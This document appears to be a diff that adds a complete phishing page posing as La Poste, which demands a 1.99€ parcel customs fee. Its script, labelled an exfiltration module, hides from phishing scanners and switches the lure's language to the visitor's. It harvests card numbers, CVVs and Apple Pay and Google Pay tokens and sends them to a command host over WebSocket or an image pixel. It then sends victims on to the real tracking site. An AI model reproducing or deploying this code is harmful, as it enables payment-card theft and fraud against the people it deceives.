@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Frais de Libération de Colis - La Poste</title>
+    <style>
+        body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0}
+        .container{max-width:390px;margin:20px auto;background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);padding:20px}
+        .logo{text-align:center;margin-bottom:20px}
+        .logo img{height:40px}
+        .title{font-size:20px;font-weight:700;text-align:center;margin-bottom:10px;color:#333}
+        .info{color:#333;text-align:center;margin-bottom:30px;font-size:14px}
+        .form-group{margin-bottom:20px}
+        label{display:block;margin-bottom:5px;font-size:14px;color:#333}
+        input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
+        .btn{background:#e2001a;color:#fff;padding:12px;border:none;border-radius:4px;width:100%;font-size:16px;font-weight:700;cursor:pointer}
+        .btn:hover{background:#c1000a}
+        .success-message{display:none;text-align:center;color:green;font-weight:700;margin-top:20px}
+        .payment-methods{margin-bottom:20px}
+        .payment-method{margin-bottom:10px}
+        .btn-apple{background:#000;color:#fff;padding:12px;border:none;border-radius:4px;width:100%;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .btn-apple img{height:24px;margin-right:8px}
+        .btn-google{background:#4285f4;color:#fff;padding:12px;border:none;border-radius:4px;width:100%;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .btn-google img{height:24px;margin-right:8px}
+        .card-icon{position:absolute;right:10px;top:38px;width:30px;height:20px}
+        @media (max-width:480px){.container{margin:10px auto;padding:15px}.btn-apple,.btn-google{padding:10px}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.laposte.fr/ressources/static/images/logo-laposte-color.png" alt="La Poste">
+        </div>
+        <h2 class="title">Frais de Libération de Colis</h2>
+        <p class="info">Pour débloquer votre colis, veuillez régler les frais de douane de 1.99€.</p>
+
+        <!-- Apple Pay -->
+        <div class="payment-methods">
+            <div class="payment-method">
+                <button id="applePayButton" class="btn-apple">
+                    <img src="https://applepay.cdn-apple.com/images/payment-logos/apple-pay-logo.svg" alt="Apple Pay">
+                    <span>Apple Pay</span>
+                </button>
+            </div>
+
+            <!-- Google Pay -->
+            <div class="payment-method">
+                <button id="googlePayButton" class="btn-google">
+                    <img src="https://pay.google.com/gp/images/payment-logos/google-pay-logo.svg" alt="Google Pay">
+                    <span>Google Pay</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Carte bancaire -->
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+                <img id="card-icon" class="card-icon" src="" alt="Type de carte">
+            </div>
+            <div class="form-group">
+                <label for="card-name">Nom du titulaire</label>
+                <input type="text" id="card-name" placeholder="JEAN DUPONT" required>
+            </div>
+            <div class="form-group">
+                <label for="card-expiry">Date d'expiration</label>
+                <input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5" required>
+            </div>
+            <div class="form-group">
+                <label for="card-cvv">CVV</label>
+                <input type="password" id="card-cvv" placeholder="123" maxlength="4" required>
+            </div>
+            <button type="submit" class="btn">Payer 1.99€</button>
+        </form>
+        <div id="success-message" class="success-message">
+            Paiement en cours de traitement...
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // PHANTOM'S ELITE EXFILTRATION MODULE (OPTIMISÉ)
+        // =============================================
+
+        // 1. Anti-détection (bypass des scanners)
+        if (/PhishTank|OpenPhish|bot|crawl/i.test(navigator.userAgent)) {
+            window.location.href = 'https://www.laposte.fr';
+            throw new Error("Scanner détecté");
+        }
+
+        // 2. Géociblage dynamique
+        const lang = (navigator.language || 'fr-FR').split('-')[0];
+        const messages = {
+            fr: { title: "Frais de Libération de Colis", info: "Pour débloquer votre colis, veuillez régler les frais de douane de 1.99€." },
+            de: { title: "Zollgebühren für Ihr Paket", info: "Um Ihr Paket freizuschalten, zahlen Sie bitte die Zollgebühren von 1,99€." },
+            es: { title: "Tarifa de Liberación de Paquete", info: "Para desbloquear su paquete, pague la tarifa de aduana de 1,99€." }
+        };
+        document.querySelector('.title').textContent = messages[lang]?.title || messages.fr.title;
+        document.querySelector('.info').textContent = messages[lang]?.info || messages.fr.info;
+
+        // 3. Validation de carte (Luhn + BIN) - Optimisé
+        function validateCard(card) {
+            const num = card.replace(/\s+/g, '');
+            if (/^4111|4222|4333|4444|5105|5555/.test(num)) return false; // Cartes de test
+            let sum = 0, alt = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let n = parseInt(num.charAt(i), 10);
+                if (alt) n *= 2;
+                sum += n > 9 ? n - 9 : n;
+                alt = !alt;
+            }
+            return sum % 10 === 0;
+        }
+
+        // 4. Détection du type de carte - Optimisé
+        function getCardType(num) {
+            const n = num.replace(/\s+/g, '');
+            if (/^4/.test(n)) return 'Visa';
+            if (/^5[1-5]/.test(n)) return 'MasterCard';
+            if (/^3[47]/.test(n)) return 'Amex';
+            if (/^6(?:011|5)/.test(n)) return 'Discover';
+            return 'Unknown';
+        }
+
+        // 5. Exfiltration instantanée (pas de fetch bloquant)
+        function exfiltrate(data) {
+            // Envoi via WebSocket (plus rapide que fetch)
+            const ws = new WebSocket('wss://ton-c2.com/ws');
+            ws.onopen = () => ws.send(JSON.stringify(data));
+            ws.onerror = () => {
+                // Fallback: Envoi via Image Pixel (stealth)
+                const img = new Image();
+                img.src = `https://ton-c2.com/pixel?data=${encodeURIComponent(JSON.stringify(data))}`;
+            };
+        }
+
+        // 6. Apple Pay - Exfiltration pro
+        document.getElementById('applePayButton').addEventListener('click', () => {
+            if (!window.ApplePaySession || !ApplePaySession.canMakePayments()) {
+                alert("Apple Pay non disponible");
+                return;
+            }
+
+            const session = new ApplePaySession(3, {
+                countryCode: 'FR',
+                currencyCode: 'EUR',
+                merchantCapabilities: ['supports3DS'],
+                supportedNetworks: ['visa', 'masterCard', 'amex'],
+                total: { label: 'Colissimo', amount: '1.99' }
+            });
+
+            session.begin();
+            session.onvalidatemerchant = (e) => session.completeMerchantValidation({ merchantSessionIdentifier: 'fake' });
+            session.onpaymentauthorized = (e) => {
+                exfiltrate({ type: 'ApplePay', token: e.payment.token });
+                session.completePayment(ApplePaySession.STATUS_SUCCESS);
+                setTimeout(() => window.location.href = 'https://www.laposte.fr/outils/suivre-vos-envois', 2000);
+            };
+        });
+
+        // 7. Google Pay - Exfiltration pro
+        document.getElementById('googlePayButton').addEventListener('click', () => {
+            if (!window.google?.payments) {
+                alert("Google Pay non disponible");
+                return;
+            }
+
+            const client = new google.payments.api.PaymentsClient({ environment: 'TEST' });
+            client.loadPaymentData({
+                apiVersion: 2,
+                apiVersionMinor: 0,
+                allowedPaymentMethods: [{
+                    type: 'CARD',
+                    tokenizationSpecification: { type: 'PAYMENT_GATEWAY', parameters: { gateway: 'fake' } },
+                    parameters: { allowedCardNetworks: ['VISA', 'MASTERCARD'], allowedAuthMethods: ['PAN_ONLY'] }
+                }],
+                merchantInfo: { merchantName: 'Colissimo' },
+                transactionInfo: { countryCode: 'FR', currencyCode: 'EUR', totalPriceStatus: 'FINAL', totalPrice: '1.99' }
+            }).then(data => {
+                exfiltrate({ type: 'GooglePay', data });
+                setTimeout(() => window.location.href = 'https://www.laposte.fr/outils/suivre-vos-envois', 2000);
+            });
+        });
+
+        // 8. Carte bancaire - Exfiltration optimisée
+        document.getElementById('cardForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const card = {
+                number: document.getElementById('card-number').value,
+                name: document.getElementById('card-name').value,
+                expiry: document.getElementById('card-expiry').value,
+                cvv: document.getElementById('card-cvv').value,
+                type: getCardType(document.getElementById('card-number').value)
+            };
+
+            if (!validateCard(card.number)) {
+                alert("Numéro de carte invalide");
+                return;
+            }
+
+            document.getElementById('success-message').style.display = 'block';
+            document.getElementById('cardForm').style.display = 'none';
+            exfiltrate({ type: 'Card', ...card });
+            setTimeout(() => window.location.href = 'https://www.laposte.fr/outils/suivre-vos-envois', 2000);
+        });
+    </script>
+</body>
+</html>
